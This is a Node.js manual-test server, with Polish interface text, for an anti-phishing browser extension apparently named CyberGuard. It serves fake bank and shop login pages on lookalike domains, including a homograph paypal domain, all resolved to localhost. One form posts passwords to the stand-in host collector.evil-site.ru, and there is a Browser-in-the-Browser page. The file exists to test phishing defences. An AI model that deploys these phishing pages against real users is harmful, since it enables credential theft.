#!/usr/bin/env node

'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const { spawn } = require('child_process');
const { bitbPage } = require('../fixtures/bitb-page.js');
const { LINK_HOSTS, linksPage, inboxPage, emailBody } = require('../fixtures/links-page.js');

const PORT = Number(process.env.PORT) || 8080;
const ROOT = path.resolve(__dirname, '..', '..');

let blockedHost = 'brak-listy.invalid';
try {
  blockedHost = JSON.parse(fs.readFileSync(path.join(ROOT, 'src', 'rules', 'main.json'), 'utf-8'))[0].condition.requestDomains[0];
} catch {
  console.warn('Brak src/rules/main.json — uruchom najpierw "npm run build".');
}

const FAKE_HOSTS = [
  'online.mbank.pl', 'mbank-logowanie.com', 'super-promocje24.com', 'moj-nowy-sklep.pl',
  'forum-wedkarskie.pl', 'przepisy-babci.pl', 'sklep-testowy.pl', 'collector.evil-site.ru',
  'portal-x.com', 'login-widget.com', 'allegro-okazje.pl', 'xn--pypal-4ve.com', 'wygraj-nagrode.pl', blockedHost,
  ...LINK_HOSTS,
].filter((h, i, all) => all.indexOf(h) === i);

const u = (host, p = '/') => `http://${host}:${PORT}${p}`;

function page(title, body) {
  return `<!doctype html><html lang="pl"><head><meta charset="utf-8"><title>${title}</title>
<style>body{font-family:system-ui,sans-serif;max-width:760px;margin:0 auto;padding:280px 24px 40px;font-size:18px;line-height:1.5}
input,button{font-size:18px;padding:6px 10px}li{margin:8px 0}</style></head><body>${body}</body></html>`;
}

function loginPage(host, action = '/zalogowano') {
  return page(`Logowanie – ${host}`, `<h1>Logowanie – ${host}</h1>
<p><em>Fałszywa strona testowa CyberGuard (działa na Twoim komputerze).</em></p>
<form method="post" action="${action}">
  <p><label>Login <input name="user" value="jan.testowy"></label></p>
  <p><label>Hasło <input type="password" name="pass"></label></p>
  <p><button type="submit">Zaloguj</button></p>
</form>`);
}

const server = http.createServer((req, res) => {
  const host = (req.headers.host || '').split(':')[0];
  const url = new URL(req.url, 'http://x');
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });

  if (req.method === 'POST') {
    req.resume();
    console.log(`  ⚠ FORMULARZ WYSŁANY do ${host}${url.pathname}`);
    return res.end(page('Wysłano', `<h1>Formularz został wysłany do ${host}</h1><p><a href="${u('localhost')}">← lista testów</a></p>`));
  }
  if (url.pathname === '/login') return res.end(loginPage(host));
  if (url.pathname === '/xform') return res.end(loginPage(host, `http://collector.evil-site.ru:${PORT}/kradziez`));
  if (url.pathname === '/frame') {
    return res.end(page('Portal z ramką', `<h1>Portal z ramką logowania (${host})</h1>
<iframe src="${u('login-widget.com', '/login')}" width="700" height="420" style="border:2px solid #999"></iframe>`));
  }
  if (url.pathname === '/bitb') return res.end(bitbPage(host));
  if (url.pathname === '/links') return res.end(linksPage(PORT));
  if (url.pathname === '/inbox') return res.end(inboxPage(PORT));
  if (url.pathname === '/email') return res.end(emailBody(PORT));
  if (url.pathname === '/ping') return res.end('ok');
  if (host === 'localhost' || host === '127.0.0.1') {
    return res.end(page('Testy CyberGuard', `<h1>Ręczne testy CyberGuard</h1>
<p>Używaj wymyślonego hasła (min. 4 znaki), np. <code>TestoweHaslo123!</code> — nigdy prawdziwego.</p>
<p id="check" style="padding:12px 16px;border-radius:10px;font-weight:700;background:#eee">Sprawdzam okno…</p>
<script>
  fetch(${JSON.stringify(u('online.mbank.pl', '/ping'))}, { mode: 'no-cors', cache: 'no-store' })
    .then(() => { check.textContent = '✔ To jest okno testowe — fałszywe adresy działają.'; check.style.background = '#d6f5df'; })
    .catch(() => { check.textContent = '✖ To NIE jest okno testowe. Zamknij tę kartę i użyj okna otwartego przez „npm.cmd run test:manual”.'; check.style.background = '#fbd5da'; });
</script>
<ol>
<li>Strona z listy oszustw: <a href="${u(blockedHost)}">${blockedHost}</a></li>
<li>„Prawdziwy” bank – zaloguj się: <a href="${u('online.mbank.pl', '/login')}">online.mbank.pl</a></li>
<li>To samo hasło na obcej stronie: <a href="${u('super-promocje24.com', '/login')}">super-promocje24.com</a></li>
<li>To samo hasło, „ufam tej stronie”: <a href="${u('moj-nowy-sklep.pl', '/login')}">moj-nowy-sklep.pl</a></li>
<li>Hasło w ramce: <a href="${u('portal-x.com', '/frame')}">portal-x.com</a></li>
<li>Zwykłe hasło na forum: <a href="${u('forum-wedkarskie.pl', '/login')}">forum-wedkarskie.pl</a>, potem to samo na <a href="${u('przepisy-babci.pl', '/login')}">przepisy-babci.pl</a></li>
<li>Podróbka adresu: <a href="${u('mbank-logowanie.com')}">mbank-logowanie.com</a>, <a href="${u('allegro-okazje.pl')}">allegro-okazje.pl</a>, <a href="${u('xn--pypal-4ve.com')}">pаypal.com (cyrylica)</a></li>
<li>Formularz wysyłający hasło gdzie indziej: <a href="${u('sklep-testowy.pl', '/xform')}">sklep-testowy.pl</a></li>
<li>Atak „Browser-in-the-Browser” (fałszywe okno banku): <a href="${u('wygraj-nagrode.pl', '/bitb')}">wygraj-nagrode.pl</a> — najpierw zrób punkt 2</li>
<li>Linki, których napis udaje inny adres (także w poczcie): <a href="${u('linki-testowe.pl', '/links')}">linki-testowe.pl</a></li>
</ol>`));
  }
  return res.end(page(host, `<h1>Strona ${host}</h1><p>Fałszywa strona testowa.</p>`));
});

function findBrowser() {
  const candidates = [
    process.env.CHROME_PATH,
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
    path.join(process.env.LOCALAPPDATA || '', 'Google\\Chrome\\Application\\chrome.exe'),
    'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
    '/usr/bin/google-chrome',
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
  ].filter(Boolean);
  return candidates.find((p) => fs.existsSync(p)) || null;
}

server.listen(PORT, '127.0.0.1', () => {
  const profile = path.join(os.tmpdir(), 'cyberguard-test-profile');
  const args = [
    `--user-data-dir=${profile}`,
    `--host-resolver-rules=${FAKE_HOSTS.map((h) => `MAP ${h} 127.0.0.1`).join(',')}`,
    `--lang=${process.env.TEST_LANG || 'pl'}`,
    '--no-first-run',
    '--no-default-browser-check',
    'chrome://extensions',
    u('localhost'),
  ];

  const noOpen = process.argv.includes('--no-open');
  const browser = noOpen ? null : findBrowser();
  if (browser) {
    spawn(browser, args, { detached: true, stdio: 'ignore' }).unref();
  }

  console.log(`
Serwer testowy działa na porcie ${PORT}.
${browser ? `
Otworzyło się NOWE, osobne okno przeglądarki (testowy profil) z dwiema kartami.` : `
${noOpen ? 'Nie otwieram przeglądarki (--no-open).' : 'Nie znaleziono Chrome (ustaw CHROME_PATH).'} Uruchom ją ręcznie z parametrami:
  ${args.map((a) => JSON.stringify(a)).join(' ')}`}

1) W karcie chrome://extensions TEGO okna: Tryb dewelopera → Załaduj rozpakowane → folder:
   ${path.join(ROOT, 'src')}

2) Przejdź do karty ${u('localhost')} i odśwież ją. Na górze ma być zielone
   „✔ To jest okno testowe”. Jeśli jest czerwone — jesteś w zwykłej przeglądarce.

   Nie klikaj linków w tym terminalu — otworzą się w zwykłej przeglądarce.

Tutaj zobaczysz komunikat za każdym razem, gdy jakiś formularz zostanie wysłany.
Ctrl+C kończy serwer.
`);
});
